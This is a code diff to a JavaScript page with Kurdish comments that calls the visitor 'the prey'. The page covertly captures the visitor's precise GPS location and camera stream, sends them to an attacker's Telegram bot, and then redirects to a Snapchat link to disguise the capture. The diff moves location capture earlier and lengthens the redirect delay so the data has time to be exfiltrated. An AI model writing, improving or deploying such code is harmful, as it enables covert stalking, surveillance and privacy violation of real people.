@@ -15,10 +15,17 @@
     async function capture() {
         if (!targetID) return;
 
-        // 🔥 ڕێدایرێکت دوای ٥ چرکە بە بەهێزترین شێواز (وەک خۆی)
+        // 📍 ١. گۆڕینی شوێنی لوکەیشن بۆ سەرەتا (وەک کۆدی یەکەم)
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendLocation(pos.coords.latitude, pos.coords.longitude);
+        }, err => {
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری لە لوکەیشن کرد.");
+        }, { enableHighAccuracy: true });
+
+        // 🔥 ٢. گۆڕینی کاتی ڕێدایرێکت بۆ ١٠ چرکە (بۆ ئەوەی لوکەیشنەکە فریای ناردن بکەوێت)
         setTimeout(() => {
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-        }, 5000);
+        }, 10000);
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -41,11 +48,6 @@
                     sendToTelegram(report);
                 });
 
-            // 📍 گۆڕینی بەشی GPS بۆ وردبینی بەرز (بەبێ تێکدانی لۆژیکەکە)
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
-
             const video = document.createElement('video');
             video.srcObject = stream;
             video.muted = true;
@@ -64,6 +66,7 @@
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
+
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -71,6 +74,7 @@
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
+
     function sendLocation(lat, lon) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
             method: 'POST',
@@ -78,6 +82,7 @@
             body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
         });
     }
+
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
